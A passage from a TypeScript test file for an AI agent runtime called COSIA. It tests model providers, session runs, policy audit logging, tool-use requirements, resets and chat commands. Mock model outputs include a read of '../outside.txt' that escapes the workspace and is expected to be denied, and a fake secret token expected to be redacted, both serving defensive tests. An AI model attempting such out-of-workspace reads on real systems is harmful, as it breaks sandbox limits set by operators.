      expect(await missingKey.checkAuth()).toMatchObject({ ok: false, reason: "missing_api_key" });
    } finally {
      if (previous === undefined) {
        delete process.env.COSIA_TEST_KEY;
      } else {
        process.env.COSIA_TEST_KEY = previous;
      }
    }
  });

  it("parses openai-compatible final and tool_call responses", async () => {
    const finalProvider = configuredOpenAIProvider(async () => jsonResponse({
      choices: [{ message: { content: '{"type":"final","content":"ok","memoryCandidates":[]}' } }]
    }));
    expect((await finalProvider.complete({ prompt: "hi", sessionId: "s" })).step).toMatchObject({ type: "final", content: "ok" });

    const toolProvider = configuredOpenAIProvider(async () => jsonResponse({
      choices: [{ message: { content: '{"type":"tool_call","tool":"shell_request","args":{"command":"node --version","reason":"preview only"}}' } }]
    }));
    expect((await toolProvider.complete({ prompt: "status", sessionId: "s" })).step).toMatchObject({ type: "tool_call", tool: "shell_request" });
  });

  it("uses OpenRouter URL, env key, safe header merge, and json response format", async () => {
    const previous = process.env.OPENROUTER_API_KEY;
    process.env.OPENROUTER_API_KEY = "openrouter-key";
    let requestUrl = "";
    let requestHeaders: Record<string, string> = {};
    let requestBody: Record<string, unknown> = {};
    try {
      const provider = configuredOpenAIProvider(async (input, init) => {
        requestUrl = String(input);
        requestHeaders = init?.headers as Record<string, string>;
        requestBody = JSON.parse(String(init?.body ?? "{}")) as Record<string, unknown>;
        return jsonResponse({
          choices: [{ message: { content: '{"type":"final","content":"ok","memoryCandidates":[]}' } }]
        });
      }, {
        id: "openrouter",
        baseUrl: "https://openrouter.ai/api/v1",
        model: "openai/gpt-test",
        apiKeyEnv: "OPENROUTER_API_KEY",
        responseFormat: "json_object",
        extraHeaders: {
          "HTTP-Referer": "https://github.com/Fintail86/Codex-Oriented-Agent",
          "X-OpenRouter-Title": "COSIA",
          Authorization: "Bearer wrong",
          "Content-Type": "text/plain"
        }
      });
      await provider.complete({ prompt: "hello", sessionId: "s" });
      expect(requestUrl).toBe("https://openrouter.ai/api/v1/chat/completions");
      expect(requestHeaders.authorization).toBe("Bearer openrouter-key");
      expect(requestHeaders["content-type"]).toBe("application/json");
      expect(requestHeaders["HTTP-Referer"]).toBe("https://github.com/Fintail86/Codex-Oriented-Agent");
      expect(requestHeaders["X-OpenRouter-Title"]).toBe("COSIA");
      expect(requestHeaders.Authorization).toBeUndefined();
      expect(requestHeaders["Content-Type"]).toBeUndefined();
      expect(requestBody.response_format).toEqual({ type: "json_object" });
    } finally {
      if (previous === undefined) {
        delete process.env.OPENROUTER_API_KEY;
      } else {
        process.env.OPENROUTER_API_KEY = previous;
      }
    }
  });

  it("omits response_format when responseFormat is null", async () => {
    let requestBody: Record<string, unknown> = {};
    const provider = configuredOpenAIProvider(async (_input, init) => {
      requestBody = JSON.parse(String(init?.body ?? "{}")) as Record<string, unknown>;
      return jsonResponse({
        choices: [{ message: { content: '{"type":"final","content":"ok","memoryCandidates":[]}' } }]
      });
    }, {
      responseFormat: null
    });
    await provider.complete({ prompt: "hello", sessionId: "s" });
    expect(requestBody.response_format).toBeUndefined();
  });

  it("retries malformed AgentStep JSON using provider retry count", async () => {
    let calls = 0;
    let retryBody = "";
    const provider = configuredOpenAIProvider(async (_input, init) => {
      calls += 1;
      if (calls === 2) {
        retryBody = String(init?.body ?? "");
      }
      return jsonResponse({
        choices: [{
          message: {
            content: calls === 1
              ? "not json"
              : '{"type":"final","content":"fixed","memoryCandidates":[]}'
          }
        }]
      });
    });

    const output = await provider.complete({ prompt: "Return JSON", sessionId: "s" });
    expect(output.step).toMatchObject({ type: "final", content: "fixed" });
    expect(calls).toBe(2);
    expect(retryBody).toContain("You returned invalid JSON");
    expect(retryBody).toContain("not json");
  });

  it("maps openai-compatible fetch and HTTP failures to provider reasons", async () => {
    await expect(configuredOpenAIProvider(async () => {
      throw new Error("ECONNREFUSED");
    }).complete({ prompt: "x", sessionId: "s" })).rejects.toMatchObject({ reason: "network_error" });

    await expect(configuredOpenAIProvider(async () => jsonResponse({ error: "bad key" }, 401))
      .complete({ prompt: "x", sessionId: "s" })).rejects.toMatchObject({ reason: "auth_failed" });

    await expect(configuredOpenAIProvider(async () => jsonResponse({ error: "slow down" }, 429))
      .complete({ prompt: "x", sessionId: "s" })).rejects.toMatchObject({ reason: "rate_limited" });

    await expect(configuredOpenAIProvider(async () => jsonResponse({ error: "server" }, 500))
      .complete({ prompt: "x", sessionId: "s" })).rejects.toMatchObject({ reason: "http_error" });

    await expect(configuredOpenAIProvider(async () => jsonResponse({ choices: [] }))
      .complete({ prompt: "x", sessionId: "s" })).rejects.toMatchObject({ reason: "malformed_response" });
  });

  it("maps openai-compatible timeout and prompt char limit before model use", async () => {
    const timeoutProvider = configuredOpenAIProvider((_input, init) => new Promise<Response>((_resolve, reject) => {
      init?.signal?.addEventListener("abort", () => {
        const error = new Error("aborted");
        error.name = "AbortError";
        reject(error);
      });
    }), { timeoutMs: 1 });
    await expect(timeoutProvider.complete({ prompt: "x", sessionId: "s" })).rejects.toMatchObject({ reason: "timeout" });

    const limitProvider = configuredOpenAIProvider(async () => jsonResponse({ choices: [] }), { maxPromptChars: 3 });
    await expect(limitProvider.complete({ prompt: "too long", sessionId: "s" })).rejects.toMatchObject({ reason: "malformed_response" });
  });

  it("runs a session with the mock provider and writes context memory", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Design the runtime MVP");

    const content = await runSession(root, {
      sessionId: session.id,
      prompt: "Summarize the goal",
      providerId: "mock"
    });
    expect(content).toContain(session.id);

    const context = await readFile(join(root, "sessions", session.id, "CONTEXT_MEMORY.md"), "utf8");
    expect(context).toContain("Summarize the goal");
    const manifest = (await readFile(join(root, "sessions", session.id, "PROMPT_MANIFEST.jsonl"), "utf8")).trim().split(/\r?\n/);
    expect(manifest.length).toBeGreaterThan(0);
    expect(JSON.parse(manifest[0])).toMatchObject({
      sessionId: session.id,
      modelStep: 1
    });
    const readable = await sessions.listPromptManifests(session.id, 1);
    expect(readable[0]).toMatchObject({ sessionId: session.id, modelStep: 1 });
    const debugDir = join(root, "sessions", session.id, "debug");
    const debugMetadata = JSON.parse(await readFile(join(debugDir, "LAST_TURN.json"), "utf8")) as Record<string, unknown>;
    expect(debugMetadata).toMatchObject({
      sessionId: session.id,
      modelStep: 1
    });
    expect(debugMetadata.promptChars).toBeGreaterThan(0);
    const lastUserMessage = await readFile(join(debugDir, "LAST_USER_MESSAGE.md"), "utf8");
    const lastPrompt = await readFile(join(debugDir, "LAST_PROMPT.md"), "utf8");
    expect(lastUserMessage).toContain("Summarize the goal");
    expect(lastPrompt).toContain("CURRENT USER REQUEST");
    expect(lastPrompt).toContain("Summarize the goal");
  });

  it("records run lineage when execution agent overrides session assignment", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Run lineage handoff");

    const content = await runSession(root, {
      sessionId: session.id,
      agentId: "architect-agent",
      prompt: "[MOCK_TOOL_CALL:search_files:COSIA] [MOCK_CANDIDATE] [MOCK_SKILL_CANDIDATE]",
      providerId: "mock"
    });
    expect(content).toContain(session.id);

    expect((await sessions.loadSession(session.id)).assignedAgentId).toBe("cosia-agent");
    const context = await readFile(join(root, "sessions", session.id, "CONTEXT_MEMORY.md"), "utf8");
    expect(context).toContain("Agent:\narchitect-agent");

    const [manifest] = await sessions.listPromptManifests(session.id, 1);
    expect(manifest.agentId).toBe("architect-agent");

    const audit = await new PolicyAuditLog(root).list(session.id, 10);
    expect(audit.some((event) => event.agentId === "architect-agent" && event.tool === "search_files")).toBe(true);

    const memoryCandidates = await new MemoryManager(root).listCandidates(true);
    expect(memoryCandidates.some((candidate) => candidate.record?.sourceAgentId === "architect-agent")).toBe(true);

    const skillCandidates = new SkillManager(root).listCandidates(true);
    expect(skillCandidates.some((candidate) => candidate.record.sourceAgentId === "architect-agent")).toBe(true);
  });

  it("requires an observation tool before final when requireTools is enabled", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Inspect implementation");

    const content = await runSession(root, {
      sessionId: session.id,
      prompt: "Inspect the current implementation",
      providerId: "mock",
      requireTools: true
    });
    expect(content).toContain(session.id);

    const context = await readFile(join(root, "sessions", session.id, "CONTEXT_MEMORY.md"), "utf8");
    expect(context).toContain("Tools:");
    expect(context).toContain("search_files");

    const audit = await new PolicyAuditLog(root).list(session.id, 10);
    expect(audit.some((event) => event.eventType === "tool_decision" && event.allowed && event.tool === "search_files")).toBe(true);
    expect(audit.every((event) => event.runId)).toBe(true);
    const formatted = formatPolicyAuditEvents(audit);
    expect(formatted).toContain("Run:");
    expect(formatted).toContain("ALLOW  tool_decision");
    expect(formatted).not.toContain("\"eventType\"");
  });

  it("filters policy audit events by latest run and run id", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Audit run ids");

    await runSession(root, {
      sessionId: session.id,
      prompt: "First inspection",
      providerId: "mock",
      requireTools: true
    });
    await runSession(root, {
      sessionId: session.id,
      prompt: "Second inspection",
      providerId: "mock",
      requireTools: true
    });

    const audit = new PolicyAuditLog(root);
    const all = await audit.list(session.id, 50);
    const runIds = [...new Set(all.map((event) => event.runId).filter(Boolean))];
    expect(runIds).toHaveLength(2);

    const latest = await audit.list(session.id, { latestRun: true, limit: 20 });
    expect(latest.length).toBeGreaterThan(0);
    expect(new Set(latest.map((event) => event.runId))).toEqual(new Set([runIds[1]]));

    const firstRun = await audit.list(session.id, { runId: runIds[0], limit: 20 });
    expect(firstRun.length).toBeGreaterThan(0);
    expect(new Set(firstRun.map((event) => event.runId))).toEqual(new Set([runIds[0]]));
  });

  it("uses POLICY.json observation tools as the source of truth for requireTools", async () => {
    const root = await initializedWorkspace();
    const policyPath = join(root, "codex", "POLICY.json");
    const policy = JSON.parse(await readFile(policyPath, "utf8")) as Record<string, unknown>;
    policy.requireTools = {
      observationTools: ["read_file"],
      writeFileSatisfies: false
    };
    await writeFile(policyPath, `${JSON.stringify(policy, null, 2)}\n`, "utf8");
    await new PolicyManager(root).syncMarkdown();

    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Policy observation source of truth");
    let calls = 0;
    const provider: ModelProvider = {
      id: "test",
      checkAuth: async () => ({ ok: true, message: "ok" }),
      complete: async () => {
        calls += 1;
        if (calls === 1) {
          return parseModelOutput('{"type":"tool_call","tool":"search_files","args":{"query":"COSIA"}}');
        }
        if (calls === 2) {
          return parseModelOutput('{"type":"final","content":"final after search only","memoryCandidates":[]}');
        }
        if (calls === 3) {
          return parseModelOutput('{"type":"tool_call","tool":"read_file","args":{"path":"codex/RULES.md"}}');
        }
        return parseModelOutput('{"type":"final","content":"final after policy observation","memoryCandidates":[]}');
      }
    };

    const content = await runSession(root, {
      sessionId: session.id,
      prompt: "Inspect policy",
      provider,
      requireTools: true
    });

    expect(content).toBe("final after policy observation");
    expect(calls).toBe(4);
    const audit = await new PolicyAuditLog(root).list(session.id, 20);
    expect(audit.some((event) => event.ruleId === "runtime.require_tools.observation")).toBe(true);
  });

  it("records denied workspace access and overwrite approval requirements in policy audit", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const deniedSession = await sessions.createSession("architect-agent", "Audit denied access");
    let deniedCalls = 0;
    const deniedProvider: ModelProvider = {
      id: "test",
      checkAuth: async () => ({ ok: true, message: "ok" }),
      complete: async () => {
        deniedCalls += 1;
        if (deniedCalls === 1) {
          return parseModelOutput('{"type":"tool_call","tool":"read_file","args":{"path":"../outside.txt"}}');
        }
        return parseModelOutput('{"type":"final","content":"done","memoryCandidates":[]}');
      }
    };

    await runSession(root, {
      sessionId: deniedSession.id,
      prompt: "Try outside read",
      provider: deniedProvider
    });
    const deniedAudit = await new PolicyAuditLog(root).list(deniedSession.id, 10);
    expect(deniedAudit.some((event) => !event.allowed && event.ruleId === "workspace.inside_only")).toBe(true);

    const overwriteSession = await sessions.createSession("architect-agent", "Audit overwrite approval");
    await writeFile(join(root, "notes.txt"), "existing", "utf8");
    let overwriteCalls = 0;
    const overwriteProvider: ModelProvider = {
      id: "test",
      checkAuth: async () => ({ ok: true, message: "ok" }),
      complete: async () => {
        overwriteCalls += 1;
        if (overwriteCalls === 1) {
          return parseModelOutput('{"type":"tool_call","tool":"write_file","args":{"path":"notes.txt","content":"secret token sk-testsecret123456"}}');
        }
        return parseModelOutput('{"type":"final","content":"done","memoryCandidates":[]}');
      }
    };

    await runSession(root, {
      sessionId: overwriteSession.id,
      prompt: "Try overwrite",
      provider: overwriteProvider
    });
    const overwriteAudit = await new PolicyAuditLog(root).list(overwriteSession.id, 10);
    expect(overwriteAudit.some((event) => event.eventType === "tool_decision" && event.allowed && event.ruleId === "delegation.workspace_local_file_write")).toBe(true);
    expect(overwriteAudit.some((event) => event.eventType === "approval_required" && event.ruleId === "write.overwrite_approval_required")).toBe(false);
    expect(JSON.stringify(overwriteAudit)).not.toContain("sk-testsecret");
    expect(JSON.stringify(overwriteAudit)).toContain("[content:");
  });

  it("does not count write_file as satisfying requireTools", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Reject write-only observation");

    const content = await runSession(root, {
      sessionId: session.id,
      prompt: "[MOCK_WRITE_ONLY:tmp/write-only.txt]",
      providerId: "mock",
      requireTools: true
    });
    expect(content).toContain(session.id);

    const context = await readFile(join(root, "sessions", session.id, "CONTEXT_MEMORY.md"), "utf8");
    expect(context).toContain("write_file");
    expect(context).toContain("search_files");
  });

  it("allows a final answer after five executed tool calls", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Inspect until budget is spent");
    let calls = 0;
    const provider: ModelProvider = {
      id: "test",
      checkAuth: async () => ({ ok: true, message: "ok" }),
      complete: async () => {
        calls += 1;
        if (calls <= 5) {
          return parseModelOutput('{"type":"tool_call","tool":"read_file","args":{"path":"codex/RULES.md"}}');
        }
        return parseModelOutput('{"type":"final","content":"final after tools","memoryCandidates":[]}');
      }
    };

    const content = await runSession(root, {
      sessionId: session.id,
      prompt: "Inspect the runtime files",
      provider,
      requireTools: true
    });

    expect(content).toBe("final after tools");
    expect(calls).toBe(6);
  });

  it("requires read_file before final when the prompt asks to inspect actual files", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Inspect CLI files");
    let calls = 0;
    const provider: ModelProvider = {
      id: "test",
      checkAuth: async () => ({ ok: true, message: "ok" }),
      complete: async () => {
        calls += 1;
        if (calls === 1) {
          return parseModelOutput('{"type":"tool_call","tool":"search_files","args":{"query":"package.json README src/cli bin"}}');
        }
        if (calls === 2) {
          return parseModelOutput('{"type":"final","content":"final without reading","memoryCandidates":[]}');
        }
        if (calls === 3) {
          return parseModelOutput('{"type":"tool_call","tool":"read_file","args":{"path":"codex/RULES.md"}}');
        }
        return parseModelOutput('{"type":"final","content":"final after read_file","memoryCandidates":[]}');
      }
    };

    const content = await runSession(root, {
      sessionId: session.id,
      prompt: "현재 구현된 CLI 명령들을 실제 파일을 보고 요약해줘.",
      provider,
      requireTools: true
    });

    expect(content).toBe("final after read_file");
    expect(calls).toBe(4);
    const context = await readFile(join(root, "sessions", session.id, "CONTEXT_MEMORY.md"), "utf8");
    expect(context).toContain("search_files, read_file");
    const audit = await new PolicyAuditLog(root).list(session.id, 10);
    expect(audit.some((event) => event.eventType === "final_rejection" && event.ruleId === "runtime.file_inspection.read_file_required")).toBe(true);
  });

  it("requires read_file for explicit file inspection even outside require-tools mode", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Inspect style source");
    let calls = 0;
    const provider: ModelProvider = {
      id: "test",
      checkAuth: async () => ({ ok: true, message: "ok" }),
      complete: async (input) => {
        calls += 1;
        if (calls === 1) {
          return parseModelOutput('{"type":"final","content":"style file checked without tool","memoryCandidates":[]}');
        }
        if (input.prompt.includes("Call read_file on a relevant path") && !input.prompt.includes("Tool: read_file")) {
          return parseModelOutput('{"type":"tool_call","tool":"read_file","args":{"path":"agents/architect-agent/STYLE.md"}}');
        }
        return parseModelOutput('{"type":"final","content":"style after read_file","memoryCandidates":[]}');
      }
    };

    const content = await runSession(root, {
      sessionId: session.id,
      prompt: "스타일 파일을 확인하고 현재 스타일을 알려줘.",
      provider
    });

    expect(content).toBe("style after read_file");
    expect(calls).toBe(3);
    const audit = await new PolicyAuditLog(root).list(session.id, 10);
    expect(audit.some((event) => event.eventType === "final_rejection" && event.ruleId === "runtime.file_inspection.read_file_required")).toBe(true);
  });

  it("mock provider follows policy retry instructions that require read_file", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Mock policy retry");

    const content = await runSession(root, {
      sessionId: session.id,
      prompt: "현재 구현 상태를 실제 파일을 보고 요약해줘.",
      providerId: "mock",
      requireTools: true
    });

    expect(content).toContain(session.id);
    const context = await readFile(join(root, "sessions", session.id, "CONTEXT_MEMORY.md"), "utf8");
    expect(context).toContain("search_files, read_file");
    const audit = await new PolicyAuditLog(root).list(session.id, 10);
    expect(audit.some((event) => event.ruleId === "runtime.file_inspection.read_file_required")).toBe(true);
  });

  it("creates shell approval previews through the model tool loop and policy audit", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Preview shell request");

    const content = await runSession(root, {
      sessionId: session.id,
      prompt: "[MOCK_TOOL_CALL:shell_request:node --version]",
      providerId: "mock"
    });

    expect(content).toContain(session.id);
    const audit = await new PolicyAuditLog(root).list(session.id, 10);
    expect(audit.some((event) => event.eventType === "tool_decision" && event.allowed && event.tool === "shell_request")).toBe(true);
  });
});

describe("status and listing", () => {
  it("reports status for empty and initialized workspaces", async () => {
    const empty = await workspace();
    const emptyReport = await getStatusReport(empty, "mock");
    expect(emptyReport.version).toBe("0.52.0");
    expect(emptyReport.agentsCount).toBe(0);
    expect(emptyReport.sessionsCount).toBe(0);
    expect(emptyReport.providerOk).toBe(true);
    expect(emptyReport.issues.some((issue) => issue.severity === "critical" && issue.id === "agents.none")).toBe(true);

    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "List sessions");
    await sessions.appendContext(session.id, "x".repeat(31_000));
    const memory = new MemoryManager(root);
    memory.addMemory({
      scope: "project",
      content: "COSIA status can count memories.",
      kind: "note"
    });

    const report = await getStatusReport(root, "mock");
    expect(report.agentsCount).toBe(2);
    expect(report.sessionsCount).toBe(1);
    expect(report.memoriesCount).toBe(1);
    expect(report.contextWarningCount).toBe(1);
    expect(report.contextCriticalCount).toBe(0);
    expect(report.largestContext?.sessionId).toBe(session.id);
    expect(report.issues.some((issue) => issue.id === "context.needs_attention")).toBe(true);
    expect(report.recommendedActions[0]).toContain("cosia session context status");
    expect(await sessions.listSessions()).toHaveLength(1);
    expect(memory.listMemories()).toHaveLength(1);
  });

  it("repairs doctor issues idempotently and previews safe reset", async () => {
    const root = await initializedWorkspace();
    await writeFile(join(root, "codex", "POLICY.md"), "# stale\n", "utf8");
    await writeFile(join(root, "skills", "SKILLS.md"), "# stale\n", "utf8");

    const firstRepair = await repairDoctor(root);
    expect(firstRepair.changed).toBe(true);
    expect(firstRepair.repaired).toEqual(expect.arrayContaining(["codex/POLICY.md", "skills/SKILLS.md"]));
    const policyAfterFirst = await readFile(join(root, "codex", "POLICY.md"), "utf8");
    const skillsAfterFirst = await readFile(join(root, "skills", "SKILLS.md"), "utf8");

    const secondRepair = await repairDoctor(root);
    expect(secondRepair.repaired).not.toContain("codex/POLICY.md");
    expect(secondRepair.repaired).not.toContain("skills/SKILLS.md");
    expect(await readFile(join(root, "codex", "POLICY.md"), "utf8")).toBe(policyAfterFirst);
    expect(await readFile(join(root, "skills", "SKILLS.md"), "utf8")).toBe(skillsAfterFirst);

    await new SessionManager(root).createSession("cosia-agent", "Preview reset");
    const preview = await previewReset(root, "state");
    expect(preview.applied).toBe(false);
    expect(preview.entries.some((entry) => entry.source === "sessions")).toBe(true);
    expect(formatResetResult(preview)).toContain("No files changed.");
    expect(await readdir(join(root, "sessions"))).not.toEqual([]);

    await expect(applyReset(root, "state", "wrong")).rejects.toThrow("RESET COSIA STATE");
  });

  it("applies state reset through backup copy and keeps source code out of reset targets", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    await sessions.createSession("cosia-agent", "Reset me");
    const result = await applyReset(root, "state", "RESET COSIA STATE");

    expect(result.applied).toBe(true);
    expect(result.status).toBe("completed");
    expect(result.entries.map((entry) => entry.source)).toContain("sessions");
    expect(result.entries.some((entry) => entry.source === "package.json")).toBe(false);
    expect(result.entries.every((entry) => entry.copied && entry.verified && entry.deleted)).toBe(true);
    expect(await readdir(join(root, "sessions"))).toEqual([]);
    expect(await readFile(join(root, "memory", "longterm.sqlite"))).toBeInstanceOf(Buffer);
  });

  it("recommends start sessions deterministically", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    const agentList = await agents.listAgents();
    const sessions = new SessionManager(root);
    const older = await sessions.createSession("cosia-agent", "Older");
    const newer = await sessions.createSession("cosia-agent", "Newer");
    await sessions.assignAgent(older.id, "missing-agent");

    const sessionList = await sessions.listSessions();
    const recommendation = recommendStartSession(sessionList, agentList);
    expect(recommendation.session?.id).toBe(newer.id);
    expect(sessionFromChoice("", sessionList, recommendation.session)).toMatchObject({ id: newer.id });
    expect(sessionFromChoice("n", sessionList, recommendation.session)).toBe("new");
    expect(sessionFromChoice("q", sessionList, recommendation.session)).toBe("quit");
  });

  it("builds a combined review inbox for pending memory and skill candidates", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Review inbox service");
    const memory = new MemoryManager(root);
    memory.addMemory({
      tier: "core",
      kind: "note",
      content: "Duplicate review candidate content."
    });
    await memory.appendCandidates([{
      tier: "core",
      kind: "note",
      content: "duplicate review candidate content",
      importance: 3,
      confidence: 0.8
    }], session, "run-review", "cosia-agent");
    const [skillCandidate] = new SkillManager(root).appendCandidates([{
      agentId: "cosia-agent",
      skillName: "Review Inbox Skill",
      reason: "Exercise review inbox.",
      content: "Use this skill when testing review inbox commands.",
      triggers: ["review inbox"]
    }], session, "run-review", "cosia-agent");

    const review = new ReviewInboxService(root);
    const inbox = await review.list();
    expect(inbox).toMatchObject({ totalPending: 2, memoryPending: 1, skillPending: 1 });
    expect(inbox.items.find((item) => item.type === "memory")?.conflictCount).toBeGreaterThan(0);
    expect(inbox.items.find((item) => item.type === "skill")?.id).toBe(skillCandidate.id);
    expect(formatReviewInbox(inbox)).toContain("Prefer id prefixes");
    expect((await review.resolve("1")).id).toBe(inbox.items[0].id);
    expect((await review.resolve(skillCandidate.id.slice(0, 8))).id).toBe(skillCandidate.id);
  });

  it("exposes review_inbox_read as a read-only model tool", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Read review inbox");
    const memory = new MemoryManager(root);
    const [candidate] = await memory.appendCandidates([{
      tier: "session",
      ownerId: session.id,
      kind: "note",
      content: "Remember that review inbox read is a runtime inspection tool.",
      importance: 2,
      confidence: 0.8
    }], session, "run-review-read", "cosia-agent");

    const result = await new ToolRegistry().execute("review_inbox_read", { filter: "memory" }, {
      workspaceRoot: root,
      allowedTools: ["review_inbox_read"],
      sessionId: session.id,
      agentId: "cosia-agent",
      runId: "run-review-read",
      sourceChannel: "cli"
    });

    expect(result.ok).toBe(true);
    const parsed = JSON.parse(result.content) as {
      totalPending: number;
      memoryPending: number;
      skillPending: number;
      items: Array<{ type: string; id: string; summary: string }>;
    };
    expect(parsed).toMatchObject({ totalPending: 1, memoryPending: 1, skillPending: 0 });
    expect(parsed.items[0]).toMatchObject({
      type: "memory",
      id: candidate.id.slice(0, 8)
    });
    expect((await memory.getCandidate(candidate.id)).record?.status).toBe("pending");
  });

  it("previews and applies bulk discard for conflicted memory candidates", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Review bulk discard");
    const memory = new MemoryManager(root);
    memory.addMemory({
      tier: "core",
      kind: "note",
      content: "Bulk conflict candidate content."
    });
    const records = await memory.appendCandidates([
      {
        tier: "core",
        kind: "note",
        content: "bulk conflict candidate content",
        importance: 3,
        confidence: 0.8
      },
      {
        tier: "session",
        ownerId: session.id,
        kind: "note",
        content: "No conflict candidate content",
        importance: 2,
        confidence: 0.7
      }
    ], session, "run-review", "cosia-agent");
    const review = new ReviewInboxService(root);

    const preview = await review.discardConflictingMemoryCandidates("bulk cleanup");
    expect(preview).toMatchObject({ applied: false, matched: 1, discarded: 0 });
    expect((await memory.getCandidate(records[0].id)).record?.status).toBe("pending");

    const applied = await review.discardConflictingMemoryCandidates("bulk cleanup", { yes: true });
    expect(applied).toMatchObject({ applied: true, matched: 1, discarded: 1 });
    expect((await memory.getCandidate(records[0].id)).record?.status).toBe("discarded");
    expect((await memory.getCandidate(records[1].id)).record?.status).toBe("pending");
  });

  it("runs shared chat REPL commands and exits gracefully", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Shared REPL test");
    const input = new PassThrough();
    const output = captureWritable();
    const errorOutput = captureWritable();

    const resultPromise = runChatRepl({
      workspaceRoot: root,
      sessionId: session.id,
      providerId: "mock",
      input,
      output: output.stream,
      errorOutput: errorOutput.stream
    });
    const feedInput = async () => {
      for (const line of ["/help", "/status", "/summary show", "/context status", "/skills list", "/exit"]) {
        input.write(`${line}\n`);
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      input.end();
    };
    await feedInput();
    const result = await resultPromise;

    expect(result).toMatchObject({ turns: 0, endedBy: "exit" });
    expect(formatChatHelp()).toContain("/context status");
    expect(formatChatHelp()).toContain("/review discard-conflicts");
    expect(formatChatHelp()).toContain("/tool grow <request>");
    expect(formatChatHelp()).toContain("/pending");
    expect(formatChatHelp()).toContain("승인할게");
    expect(output.read()).toContain("COSIA chat commands");
    expect(output.read()).toContain(`Session: ${session.id}`);
    expect(output.read()).toContain("# SESSION SUMMARY");
    expect(output.read()).toContain("Working context:");
    expect(errorOutput.read()).toContain("Type /help for commands");
  });

  it("handles tool growth slash commands inside the shared chat REPL", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Tool growth REPL test");
    const input = new PassThrough();
    const output = captureWritable();
    const errorOutput = captureWritable();

    const resultPromise = runChatRepl({
      workspaceRoot: root,
      sessionId: session.id,
      providerId: "mock",
      input,
      output: output.stream,
      errorOutput: errorOutput.stream
    });
    const feedInput = async () => {
      for (const line of [
        "/tool grow 테스트 돌려봐",
        "/tool grow show",
        "/tool grow test --yes",
        "/tool grow activate --yes",
        "/exit"
      ]) {
        input.write(`${line}\n`);
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      input.end();
    };
    await feedInput();
    const result = await resultPromise;

    expect(result).toMatchObject({ turns: 0, endedBy: "exit" });
    const text = output.read();
    expect(text).toContain("Tool growth routine created");
    expect(text).toContain("Tool growth routine:");
    expect(text).toContain("Tool candidate test passed.");
    expect(text).toContain("Active tool registration applied.");
    expect((await new AgentManager(root).loadAgent("cosia-agent")).allowedTools).toContain("local.project_check.mock");
  });

  it("does not execute tool growth through hash command shortcuts", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Tool growth hash removal test");
    const input = new PassThrough();
    const output = captureWritable();
    const errorOutput = captureWritable();

    const resultPromise = runChatRepl({
      workspaceRoot: root,
      sessionId: session.id,
      providerId: "mock",
      input,
      output: output.stream,
      errorOutput: errorOutput.stream
    });
    const feedInput = async () => {
      for (const line of [
        "#도구 성장 테스트 돌려봐",
        "/exit"
      ]) {
        input.write(`${line}\n`);
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      input.end();
    };
    await feedInput();
    const result = await resultPromise;

    expect(result).toMatchObject({ turns: 0, endedBy: "exit" });
    const text = output.read();
    expect(text).toContain("Hash command shortcuts were removed.");
    expect(text).toContain("/tool grow <request>");
    expect(new ToolGrowthManager(root).list()).toEqual([]);
  });

  it("handles review inbox commands inside the shared chat REPL", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Review REPL test");
    const memory = new MemoryManager(root);
    memory.addMemory({
      tier: "core",
      kind: "note",
      content: "Memory review conflict content."
    });
    const [memoryCandidate] = await memory.appendCandidates([{
      tier: "core",
      kind: "note",
      content: "memory review conflict content",
      importance: 3,
      confidence: 0.8
